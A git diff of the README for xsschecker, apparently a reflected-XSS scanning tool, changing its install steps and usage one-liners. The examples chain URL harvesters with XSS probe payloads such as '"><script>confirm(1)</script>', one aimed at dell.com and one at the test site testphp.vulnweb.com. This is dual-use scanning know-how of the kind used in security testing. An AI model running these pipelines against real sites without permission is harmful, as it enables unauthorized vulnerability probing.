@@ -1,24 +1,29 @@
-```
- _  _  ____  ____   ___  _  _  ____  ___  __ _  ____  ____ 
-( \/ )/ ___)/ ___) / __)/ )( \(  __)/ __)(  / )(  __)(  _ \
- )  ( \___ \\___ \( (__ ) __ ( ) _)( (__  )  (  ) _)  )   /
-(_/\_)(____/(____/ \___)\_)(_/(____)\___)(__\_)(____)(__\_)
-```
+## xsschecker
 
-<h3 align="center">xsschecker tool checking reflected endpoints finding possible xss vulnerable endpoints.</h3>
+xsschecker tool checking reflected endpoints finding possible xss vulnerable endpoints.
 
-## Install
+## Installation
 ```
 go install github.com/rix4uni/xsschecker@latest
 ```
-or
 
+## Download prebuilt binaries
 ```
-git clone https://github.com/rix4uni/xsschecker.git && cd xsschecker && go build xsschecker.go && mv xsschecker ~/go/bin/xsschecker && cd .. && rm -rf xsschecker
+wget https://github.com/rix4uni/xsschecker/releases/download/v0.0.5/xsschecker-linux-amd64-0.0.5.tgz
+tar -xvzf xsschecker-linux-amd64-0.0.5.tgz
+rm -rf xsschecker-linux-amd64-0.0.5.tgz
+mv xsschecker ~/go/bin/xsschecker
 ```
+Or download [binary release](https://github.com/rix4uni/xsschecker/releases) for your platform.
+
+## Compile from source
+```
+git clone --depth 1 github.com/rix4uni/xsschecker.git
+cd xsschecker; go install
+```
+
 ## Usage
 ```
-xsschecker -h
 Usage: xsschecker [OPTIONS]
 
 Options:
@@ -26,6 +31,8 @@ Options:
         Custom User-Agent header for HTTP requests. (default "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36")
   -ao string
         File to append the output instead of overwriting.
+  -filter
+        Print only URLs Exclude this from output, (e.g. Vulnerable/Not Vulnerable: [status] [server]).
   -i string
         Input file containing list of URLs.
   -match string
@@ -57,30 +64,32 @@ Options:
         If set, only vulnerable URLs will be printed.
 ```
 
-## Reflected XSS Mass Automation
+## Usage Examples
+### Reflected XSS Mass Automation
 ```
-cat subs.txt | waybackurls >> waybackurls-urls.txt
-cat subs.txt | gau >> gau-urls.txt
-cat live-subs.txt | hakrawler -scope >> hakrawler-urls.txt
-cat waybackurls-urls.txt gau-urls.txt hakrawler-urls.txt | anew -q urls.txt
+▶ Step 1:
+wget https://raw.githubusercontent.com/rix4uni/WordList/refs/heads/main/payloads/xss/favourite.txt
+if grep -qv "^rix4uni" "favourite.txt";then sed -i 's/^/rix4uni/' "favourite.txt";fi
 
-cat urls.txt | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>'
-```
+▶ Step 2:
+echo "dell.com" | subfinder -duc -silent -nc | waybackurls | urldedupe -s | grep -aE '=|%3D' | \
+egrep -aiv '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)' | \
+pvreplace -silent -payload favourite.txt -fuzzing-mode single | xsschecker -nc -match 'rix4uni' -vuln
 
-## Reflected XSS Oneliner Command1
-```
-echo "testphp.vulnweb.com" | waybackurls | gf xss | uro | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>' -vuln
-```
-
-## Reflected XSS Oneliner Command2
-```
-echo "testphp.vulnweb.com" | waybackurls | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>' -vuln
-
-or
-
-echo "testphp.vulnweb.com" | waybackurls | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>, "<image/src/onerror=confirm(1)>' -vuln
+▶ Step 3:
+You can run pyxss to check false positive or check manually one by one url in chrome
 ```
 
-## Reflected XSS Oneliner Command1 and Reflected XSS Oneliner Command2 Results Comparison
+### Reflected XSS Oneliner for 1 payload
+```
+▶ Step 1:
+echo "testphp.vulnweb.com" | waybackurls | urldedupe -s | grep -aE '=|%3D' | \
+egrep -aiv '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)' | \
+pvreplace -silent -payload 'rix4uni"><Img Src=OnXSS OnError=(confirm)(1)>' -fuzzing-mode single | xsschecker -nc -match 'rix4uni' -vuln
+
+▶ Step 2:
+You can run pyxss to check false positive or check manually one by one url in chrome
+```
+
+### Reflected XSS Oneliner Command1 and Reflected XSS Oneliner Command2 Results Comparison
 ![image](https://github.com/rix4uni/xsschecker/assets/72344025/8034668c-42c3-47b1-9fee-5a58c2c96d63)
-
